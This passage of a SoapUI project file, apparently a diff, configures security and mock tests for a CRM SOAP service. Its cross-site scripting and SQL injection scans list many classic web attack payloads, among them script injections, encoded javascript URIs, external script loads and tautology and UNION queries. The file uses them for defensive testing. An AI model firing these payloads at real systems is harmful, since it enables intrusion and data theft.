id="274e8442-052d-472a-9099-239343fe0b35" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:assertion type="Simple NotContains" id="0498a728-fdce-401a-81ec-3b0275abba43" name="Not Contains"><con:configuration><token>Failure</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="create" parameterName="Request" xpath="declare namespace ns2=&quot;http://predic8.com/wsdl/crm/CRMService/1/&quot; ns2:createUser" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan></con:testStepSecurityTest><con:testStepSecurityTest><con:testStepId>10220664-3bad-452c-bd0d-89743393ee75</con:testStepId><con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="7b7a3646-1bd3-462f-b722-a55b4dff71a1" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings><con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings><con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings><con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings><con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings><con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings></con:config><con:assertion type="CrosSiteScript" id="6be280b5-3e5f-4d81-9a89-8363376d44aa" name="Cross Site Scripting Detection"><con:configuration/></con:assertion><con:assertion type="Valid HTTP Status Codes" id="65c65b97-affe-4582-a4e2-4a86dbe17e26" name="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>200</codes></con:configuration></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="id" parameterName="Request" xpath="declare namespace ns2=&quot;http://predic8.com/wsdl/crm/CRMService/1/&quot; //ns2:id" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="df4cc2d4-993c-4d80-9893-534c18663005" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings><con:sqlInjectionStrings>'--</con:sqlInjectionStrings><con:sqlInjectionStrings>1'</con:sqlInjectionStrings><con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings><con:sqlInjectionStrings>1/0</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings><con:sqlInjectionStrings>;</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings><con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings><con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings></con:config><con:assertion type="Valid HTTP Status Codes" id="de3b317a-da28-4608-83be-e54c4f1d5744" name="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>200</codes></con:configuration></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="getUser" parameterName="Request" xpath="declare namespace ns2=&quot;http://predic8.com/wsdl/crm/CRMService/1/&quot; //ns2:id" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan></con:testStepSecurityTest><con:properties/><con:reportParameters/></con:securityTest></con:testCase><con:testCase id="ceb8b449-964f-4ccf-9f56-6e43de0f4e8e" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="GetAllUsers" searchProperties="true"><con:settings/><con:testStep type="request" id="b1e3655b-5e0a-4d4b-b4e8-3a47703949cc" name="getAllUsers"><con:settings/><con:config xsi:type="con:RequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>CRMServicePTBinding</con:interface><con:operation>getAll</con:operation><con:request name="getAllUsers" outgoingWss="" incomingWss="" timeout="" sslKeystore="" useWsAddressing="false" useWsReliableMessaging="false" wssPasswordType="" id="4aeff249-55a0-4f3d-8c32-d6ac4bb623f9"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.predic8.com:8080/crm/CustomerService</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">\r
+   <soapenv:Header/>\r
+   <soapenv:Body>\r
+      <ns:getAll/>\r
+   </soapenv:Body>\r
+</soapenv:Envelope>]]></con:request><con:assertion type="SOAP Response" id="be562e42-770a-4be3-afb3-3d05c1e5997d" name="SOAP Response"/><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="getAll_action"/><con:wsrmConfig version="1.2"/></con:request></con:config></con:testStep><con:properties/><con:reportParameters/></con:testCase><con:properties/><con:reportParameters/></con:testSuite><con:testSuite id="38bf18c4-734f-43c6-bf84-d79e5b56ce70" name="MockResponseTestSuite 2"><con:settings/><con:runType>SEQUENTIAL</con:runType><con:testCase id="44b996dd-7f42-4074-a217-9d21b60a3d00" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="TestCase 1" searchProperties="true"><con:settings/><con:testStep type="mockresponse" name="create" id="af267c59-1684-4e4b-9a0f-91aac517a8ea"><con:settings/><con:config xsi:type="con:MockResponseStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>CRMServicePTBinding</con:interface><con:operation>create</con:operation><con:path>/</con:path><con:port>8080</con:port><con:response name="Response 1" id="2b706809-7110-41ac-815d-134d61fe9c4f" httpResponseStatus="200" encoding="UTF-8"><con:settings/><con:responseContent><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <ns:createResponse/>
+   </soapenv:Body>
+</soapenv:Envelope>]]></con:responseContent><con:wsaConfig mustUnderstand="NONE" version="200508" action="create_action"/></con:response><con:assertion type="Simple Contains" id="c8e4f106-74ae-4d44-a8fa-a2d257adc66c"><con:configuration><token>createResponse</token><ignoreCase>true</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion></con:config></con:testStep><con:properties/><con:reportParameters/></con:testCase><con:testCase id="babac754-98ad-4875-a629-1902d179bf82" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="TestCase 2" searchProperties="true"><con:settings/><con:testStep type="mockresponse" name="get" id="8708479e-0766-4bf4-9728-14564a066402"><con:settings/><con:config xsi:type="con:MockResponseStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>CRMServicePTBinding</con:interface><con:operation>get</con:operation><con:path>/</con:path><con:port>8080</con:port><con:response name="Response 1" id="60503ca5-a35e-4d99-b941-513b43b80eb9" httpResponseStatus="200" encoding="UTF-8"><con:settings/><con:responseContent><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <ns:getResponse>
+         <customer>
+            <person>
+               <id>?</id>
+               <firstName>?</firstName>
+               <lastName>?</lastName>
+               <!--Optional:-->
+               <address>
+                  <street>?</street>
+                  <city>?</city>
+                  <zipCode>?</zipCode>
+                  <country>?</country>
+               </address>
+               <age>?</age>
+            </person>
+            <address>
+               <street>?</street>
+               <city>?</city>
+               <zipCode>?</zipCode>
+               <country>?</country>
+               <companyName>?</companyName>
+            </address>
+            <id>?</id>
+         </customer>
+      </ns:getResponse>
+   </soapenv:Body>
+</soapenv:Envelope>]]></con:responseContent><con:wsaConfig mustUnderstand="NONE" version="200508" action="get_action"/></con:response></con:config></con:testStep><con:properties/><con:reportParameters/></con:testCase><con:testCase id="c8172aee-ce66-4263-83c3-8081f7c1ff67" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="TestCase 3" searchProperties="true"><con:settings/><con:testStep type="mockresponse" name="getAll" id="6645876b-68d9-474c-ae96-76fe45060277"><con:settings/><con:config xsi:type="con:MockResponseStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>CRMServicePTBinding</con:interface><con:operation>getAll</con:operation><con:path>/</con:path><con:port>8080</con:port><con:response name="Response 1" id="c228ede0-c1eb-433d-bb59-bf9ca6d48da0" httpResponseStatus="200" encoding="UTF-8"><con:settings/><con:responseContent><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <ns:getAllResponse>
+         <!--Zero or more repetitions:-->
+         <customer>
+            <person>
+               <id>?</id>
+               <firstName>?</firstName>
+               <lastName>?</lastName>
+               <!--Optional:-->
+               <address>
+                  <street>?</street>
+                  <city>?</city>
+                  <zipCode>?</zipCode>
+                  <country>?</country>
+               </address>
+               <age>?</age>
+            </person>
+            <address>
+               <street>?</street>
+               <city>?</city>
+               <zipCode>?</zipCode>
+               <country>?</country>
+               <companyName>?</companyName>
+            </address>
+            <id>?</id>
+         </customer>
+      </ns:getAllResponse>
+   </soapenv:Body>
+</soapenv:Envelope>]]></con:responseContent><con:wsaConfig mustUnderstand="NONE" version="200508" action="getAll_action"/></con:response></con:config></con:testStep><con:properties/><con:reportParameters/></con:testCase><con:properties/><con:reportParameters/></con:testSuite><con:mockService id="6855151a-deb0-499f-8090-fdab4b76be07" port="8080" path="/" host="localhost" name="MockService 1"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.mock.WsdlMockService@require-soap-action">false</con:setting></con:settings><con:properties/><con:dataSources/><con:headerValidator/><con:mockOperation name="create" id="e497aac3-1b3d-418b-94c5-29542a1d4b31" interface="CRMServicePTBinding" operation="create"><con:settings/><con:defaultResponse>Response 1</con:defaultResponse><con:dispatchStyle>SEQUENCE</con:dispatchStyle><con:dispatchXPath/><con:routeScript/><con:response name="Response 1" id="2b706809-7110-41ac-815d-134d61fe9c4f" httpResponseStatus="200" encoding="UTF-8" dataSource=""><con:settings/><con:responseContent><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <ns:createResponse/>
+   </soapenv:Body>
+</soapenv:Envelope>]]></con:responseContent><con:wsaConfig mustUnderstand="NONE" version="200508" action="create_action"/></con:response><con:dispatchConfig/></con:mockOperation><con:mockOperation name="get" id="d4b5fccc-2e38-444b-bd8d-9104480aa34a" interface="CRMServicePTBinding" operation="get"><con:settings/><con:defaultResponse>Response 1</con:defaultResponse><con:dispatchStyle>SEQUENCE</con:dispatchStyle><con:dispatchXPath/><con:routeScript/><con:response name="Response 1" id="60503ca5-a35e-4d99-b941-513b43b80eb9" httpResponseStatus="200" encoding="UTF-8" dataSource=""><con:settings/><con:responseContent><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <ns:getResponse>
+         <customer>
+            <person>
+               <id>?</id>
+               <firstName>?</firstName>
+               <lastName>?</lastName>
+               <!--Optional:-->
+               <address>
+                  <street>?</street>
+                  <city>?</city>
+                  <zipCode>?</zipCode>
+                  <country>?</country>
+               </address>
+               <age>?</age>
+            </person>
+            <address>
+               <street>?</street>
+               <city>?</city>
+               <zipCode>?</zipCode>
+               <country>?</country>
+               <companyName>?</companyName>
+            </address>
+            <id>?</id>
+         </customer>
+      </ns:getResponse>
+   </soapenv:Body>
+</soapenv:Envelope>]]></con:responseContent><con:wsaConfig mustUnderstand="NONE" version="200508" action="get_action"/></con:response><con:dispatchConfig/></con:mockOperation><con:mockOperation name="getAll" id="13e64fb2-5cc8-4bb1-bc1e-4f35b2746f9f" interface="CRMServicePTBinding" operation="getAll"><con:settings/><con:defaultResponse>Response 1</con:defaultResponse><con:dispatchStyle>SEQUENCE</con:dispatchStyle><con:dispatchXPath/><con:routeScript/><con:response name="Response 1" id="c228ede0-c1eb-433d-bb59-bf9ca6d48da0" httpResponseStatus="200" encoding="UTF-8" dataSource=""><con:settings/><con:responseContent><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <ns:getAllResponse>
+         <!--Zero or more repetitions:-->
+         <customer>
+            <person>
+               <id>?</id>
+               <firstName>?</firstName>
+               <lastName>?</lastName>
+               <!--Optional:-->
+               <address>
+                  <street>?</street>
+                  <city>?</city>
+                  <zipCode>?</zipCode>
+                  <country>?</country>
+               </address>
+               <age>?</age>
+            </person>
+            <address>
+               <street>?</street>
+               <city>?</city>
+               <zipCode>?</zipCode>
+               <country>?</country>
+               <companyName>?</companyName>
+            </address>
+            <id>?</id>
+         </customer>
+      </ns:getAllResponse>
+   </soapenv:Body>
+</soapenv:Envelope>]]></con:responseContent><con:wsaConfig mustUnderstand="NONE" version="200508" action="getAll_action"/></con:response><con:dispatchConfig/></con:mockOperation></con:mockService><con:properties/><con:wssContainer/><con:databaseConnectionContainer/><con:oAuth2ProfileContainer/><con:oAuth1ProfileContainer/><con:reporting><con:xmlTemplates/><con:parameters/></con:reporting><con:sensitiveInformation/><con:authRepository/><con:tags/></con:soapui-project>
